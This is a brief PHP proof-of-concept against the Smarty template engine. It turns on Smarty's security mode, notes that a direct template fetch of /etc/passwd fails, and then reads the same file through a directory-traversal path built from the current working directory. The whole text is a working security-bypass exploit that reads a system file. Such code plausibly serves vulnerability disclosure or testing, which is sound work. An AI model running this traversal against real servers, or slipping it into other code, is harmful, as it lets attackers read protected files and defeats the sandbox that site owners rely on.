<?php
require_once "vendor/autoload.php";

$smarty = new Smarty;
$smarty->enableSecurity();
// Fails
//$smarty->display('eval:{fetch file="/etc/passwd"}');
// Works
$smarty->display('eval:{fetch file="'.addslashes(getcwd()).'/templates/../../../../../etc/passwd"}');
